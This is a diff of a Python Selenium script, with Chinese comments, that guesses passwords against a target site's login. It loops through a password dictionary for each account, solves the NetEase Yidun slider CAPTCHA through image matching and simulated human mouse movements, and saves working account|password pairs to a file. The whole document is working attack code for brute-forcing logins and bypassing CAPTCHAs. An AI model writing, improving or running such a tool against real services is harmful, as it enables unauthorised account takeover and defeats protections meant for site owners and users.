@@ -154,13 +154,11 @@ def imageCompare(imagePath):
 
                 data2 = fp2.read()
             file_md52= hashlib.md5(data2).hexdigest()
-      
-          
+  
             #print('--'+file_md51+'=='+file_md52+'--')
       
             if file_md51==file_md52:
-             
-                print(image_filename)
+                print('返回相同距离的图片.....')
                 return image_filename
     return "F"
 
@@ -169,27 +167,24 @@ def get_distance_by_default(rtime,offset,background_item,slider_item):
 
     download_images(driver,background_item,slider_item,rtime)
     res=imageCompare('imgs/'+rtime+'_'+slider_path)
-    
+    print('图片:'+res)
     if res!='F':
 
-        f = open("distince_data.txt")
+        f = open("distince_data.dic")
         lines = f.readlines()
         for line in lines:
             
             dis=line.replace('\n','').split('|')
-            # print('--寻找存储的距离点--')
-            # print(dis[0])
-            # print(res)
-            # print('--寻找存储的距离点--')
+          
             if  dis[0] in (res):
                 print('---distince:'+dis[1])
                 return int(dis[1])
-    # load the picture
+    
     backgroud_img = Image.open(background_path).convert("L")
     slider_img = Image.open('imgs/'+rtime+'_'+slider_path).convert("L")
     backgroud_img = np.array(backgroud_img)
     slider_img = np.array(slider_img)
-    # covld
+
     top, bottom, left = get_boundary(slider_img)
     scharr = np.array([[-6, 0, +6], [-6, 0, +6], [-6, 0, +6]])
     grad = signal.correlate2d(
@@ -206,7 +201,6 @@ def get_distance_by_default(rtime,offset,background_item,slider_item):
 
 def runData(driver,account,passwd,icount):
     #rs=crack_slider(driver,account,passwd)
-    print('---------------------')
     print('icount:'+str(icount))
     try:
         driver.delete_all_cookies()
@@ -240,64 +234,67 @@ def runData(driver,account,passwd,icount):
         runData(driver,account,passwd,icount)
     
 
-def run(driver,account,passwd,icount):
+def run(driver,account,passwd,icount,func):
+
     time.sleep(3)
-  
+    resr=''
     try:
         wait = WebDriverWait(driver, 5)
-        try:
-            background_item = wait.until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, ".yidun_bg-img"))
-            )
-            slider_item = wait.until(
-                EC.presence_of_element_located((By.CSS_SELECTOR, ".yidun_jigsaw"))
-            )
-        except Exception as e:
+        if func=='A':
+            try:
             
-            runData(driver,account,passwd,icount)
-            run(driver,account,passwd,icount)
-        resr=''
-        fore = random.randint(10, 18)
-        distance=0
-        ts=calendar.timegm(time.gmtime())
+                background_item = wait.until(
+                    EC.presence_of_element_located((By.CSS_SELECTOR, ".yidun_bg-img"))
+                )
+                slider_item = wait.until(
+                    EC.presence_of_element_located((By.CSS_SELECTOR, ".yidun_jigsaw"))
+                )
 
-        distance = get_distance_by_default(str(ts),offset,background_item,slider_item)
-        resr=str(ts)+'_'+slider_path+'|'+str(distance)
-    
-        time.sleep(2)
+                fore = random.randint(10, 18)
+                distance=0
+                ts=calendar.timegm(time.gmtime())
+                distance = get_distance_by_default(str(ts),offset,background_item,slider_item)
+                resr=str(ts)+'_'+slider_path+'|'+str(distance)
+                
+                time.sleep(2)
+            except Exception as e:
+                
+                return "F"
+        
    
-        try:
-            tracks = get_tracks(distance + fore)
-            bing_handle = None
+            try:
+                tracks = get_tracks(distance + fore)
+                bing_handle = None
+                
+                parent_element = driver.find_element(By.CSS_SELECTOR, ".yidun_control")
+                slider_btn = parent_element.find_element(By.CSS_SELECTOR,'.yidun_slider__icon')
             
-            parent_element = driver.find_element(By.CSS_SELECTOR, ".yidun_control")
-            slider_btn = parent_element.find_element(By.CSS_SELECTOR,'.yidun_slider__icon')
-           
-            ActionChains(driver).click_and_hold(slider_btn).perform()
-    
-            time.sleep(random.randint(0, 5) * 0.1)
-          
-    
-      
-            for t in tracks:
-                ActionChains(driver,duration=1).move_by_offset(t, 0).perform()
-   
-            time.sleep(random.randint(0, 5) * 0.1)
-            for t in range(1,3):
-              
-                ActionChains(driver,duration=5).move_by_offset(-21.5, 20).perform()
+                ActionChains(driver).click_and_hold(slider_btn).perform()
+        
                 time.sleep(random.randint(0, 5) * 0.1)
+            
+        
+        
+                for t in tracks:
+                    ActionChains(driver,duration=1).move_by_offset(t, 0).perform()
     
-            slider_btn = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "[class='yidun_slider__icon']")))
-            #ActionChains(driver).click(slider_btn)
-            time.sleep(2)
-            #pyautogui.mouseUp(x=0, y=0, button='left')
-     
-            ActionChains(driver).release(slider_btn).perform()
+                time.sleep(random.randint(0, 5) * 0.1)
+                for t in range(1,3):
+                
+                    ActionChains(driver,duration=5).move_by_offset(-21.5, 20).perform()
+                    time.sleep(random.randint(0, 5) * 0.1)
+        
+                slider_btn = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "[class='yidun_slider__icon']")))
+                #ActionChains(driver).click(slider_btn)
+                time.sleep(2)
+                #pyautogui.mouseUp(x=0, y=0, button='left')
+        
+                ActionChains(driver).release(slider_btn).perform()
 
-            time.sleep(3)
-        except Exception as e:
-            pass
+           
+            except Exception as e:
+                pass
+        time.sleep(3)
         try:
             handlers = driver.window_handles
             for winHandler in handlers:
@@ -310,14 +307,16 @@ def run(driver,account,passwd,icount):
                 res=driver.find_element(By.CLASS_NAME,'msg__5sckD').get_attribute('textContent')
                 driver.find_element(By.XPATH,'//*[@id="body_container"]/div[*]/div/div/p[1]/img').click()
                 time.sleep(2)
-                print('存储拖动距离.....')
-                print(resr)
-                with open("distince_data.txt", "a") as f1:  # 保存图片到本地
-                    f1.write(resr+'\n')
-                f1.close()
-            str1=res.strip()
-            print("响应内容：")
-            print(str1)
+             
+                if resr!='':
+                    print('存储拖动距离.....')
+                    print(resr)
+                    with open("distince_data.dic", "a") as f1:  # 保存图片到本地
+                        f1.write(resr+'\n')
+                    f1.close()
+                str1=res.strip()
+                print("响应内容：")
+                print(str1)
       
             '''#用户名或密码错误
             #用户名或密码错误，5次后账号将进入保护期!'''
@@ -341,9 +340,12 @@ def run(driver,account,passwd,icount):
             )
 
             if  element.get_attribute('innerText')!='':
+                with open("account.dic", "a") as f: 
+                    f.write(account+'|'+passwd+'\n')
+                f.close()
                 print('存储拖动距离.....')
                 print(resr)
-                with open("distince_data.txt", "a") as f1:  # 保存图片到本地
+                with open("distince_data.dic", "a") as f1:  # 保存图片到本地
                     f1.write(resr+'\n')
                 f1.close()
                 driver.find_element(By.XPATH,'//*[@id="root"]/div[1]/div/div[1]').click()
@@ -377,8 +379,8 @@ def run(driver,account,passwd,icount):
             print(res)
             if '失败过多' in res:
                 driver.find_element(By.CSS_SELECTOR, "[class='yidun_tips__text yidun-fallback__tip']").click()
-        
-        run(driver,account,passwd,icount)
+        print('')
+        run(driver,account,passwd,icount,func)
         
            
 
@@ -389,15 +391,18 @@ if __name__ == "__main__":
     parser.add_option('-u', dest='tgtUrl', type='string', help='single url')
 
     parser.add_option('-a', dest='accountFile', type ='string', help='accountFile for account')
-    
+    parser.add_option('-s', dest='startLine',default=1, type='int', help='start Line')
     parser.add_option('-d', dest='dataFile', type='string', help='dataFile  for password')
+    parser.add_option('-f', dest='func', type='string', help='func of run,auto or manual')
     (options, args) = parser.parse_args()
     
     
     TEST_URL = options.tgtUrl
     
     accountFile = options.accountFile
+    startLine = options.startLine
     dataFile = options.dataFile
+    func = options.func
 
     options = webdriver.ChromeOptions()
     #options.add_argument("start-maximized")
@@ -421,39 +426,42 @@ if __name__ == "__main__":
     userCount=0
 
     for account in accounts:
-  
-        #passwds = open('d:\dict.txt')
-        passwds = open(dataFile)
-        userCount=userCount+1
-        icount=1
-        for passwd in passwds:
-            account = account.strip()
-            passwd = passwd.strip()
+        if startLine==count or startLine<count:
             
-           
-            runData(driver,account,passwd,icount)
-            #runData(driver)
-            result=run(driver,account,passwd,icount)
-            count=2
-            icount=icount+1
-            print(result)
-            if result=='T':
-                with open("account.txt", "a") as f: 
-                    f.write(account+'|'+passwd+'\n')
-                f.close()
-            if result=='F' or result==None:
-                break
-            if result=='O':
-                if 'https://' in TEST_URL:
-                    sfile=TEST_URL.replace('https://','')
-                elif 'http://' in TEST_URL:
-                    sfile=TEST_URL.replace('http://','')
-                else:
-                    sfile=TEST_URL
-                if '/' in sfile:
-                    sfile=sfile.replace('/','')
-                with open(sfile, "a") as f: 
-                    f.write(account+'\n')
-                f.close()
+            #passwds = open('d:\dict.txt')
+            passwds = open(dataFile)
+            userCount=userCount+1
+            icount=1
+            
+            for passwd in passwds:
+                account = account.strip()
+                passwd = passwd.strip()
+                
+
+                runData(driver,account,passwd,icount)
+
+                #runData(driver)
+                result=run(driver,account,passwd,icount,func)
+                
+                icount=icount+1
+                print(result)
+                if result=='T':
+                    print('获取到数据：'+account+'|'+passwd+'\n')
+                    break
+                if result=='F' or result==None:
+                    break
+                if result=='O':
+                    if 'https://' in TEST_URL:
+                        sfile=TEST_URL.replace('https://','')
+                    elif 'http://' in TEST_URL:
+                        sfile=TEST_URL.replace('http://','')
+                    else:
+                        sfile=TEST_URL
+                    if '/' in sfile:
+                        sfile=sfile.replace('/','')
+                    with open(sfile, "a") as f: 
+                        f.write(account+'\n')
+                    f.close()
+        count=count+1
 
     driver.close()
